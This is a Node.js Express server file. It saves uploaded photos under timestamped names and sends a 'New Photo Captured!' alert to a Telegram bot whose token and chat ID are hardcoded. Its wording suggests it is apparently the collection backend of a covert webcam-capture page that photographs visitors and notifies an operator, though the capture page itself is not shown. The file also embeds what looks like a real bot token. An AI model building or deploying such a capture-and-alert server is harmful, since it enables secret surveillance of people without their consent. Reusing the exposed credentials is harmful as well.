import express from "express";
import multer from "multer";
import path from "path";
import fs from "fs";
import fetch from "node-fetch"; // Telegram message ke liye

const app = express();
const PORT = process.env.PORT || 10000;

// Telegram credentials
const BOT_TOKEN = "8323140156:AAEgVqXYHclaAmZXG7nbnMLfZLh9_0RoK_E";
const CHAT_ID = "6912530259";

// Middleware
app.use(express.static("public"));
app.use("/uploads", express.static("uploads"));

// Multer setup for image upload
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const uploadPath = path.join("uploads");
    if (!fs.existsSync(uploadPath)) fs.mkdirSync(uploadPath);
    cb(null, uploadPath);
  },
  filename: function (req, file, cb) {
    cb(null, "photo_" + Date.now() + ".png");
  },
});

const upload = multer({ storage });

// Handle POST image uploads
app.post("/upload", upload.single("photo"), async (req, res) => {
  try {
    const filePath = `/uploads/${req.file.filename}`;
    console.log("✅ New photo saved:", filePath);

    // Send Telegram notification
    const message = `📸 New Photo Captured!\n\nFile: ${req.file.filename}\n\nCheck your Render uploads folder.`;
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    });

    res.json({ success: true, path: filePath });
  } catch (error) {
    console.error("❌ Error uploading photo:", error);
    res.status(500).json({ success: false, error: "Upload failed" });
  }
});

// Start server
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));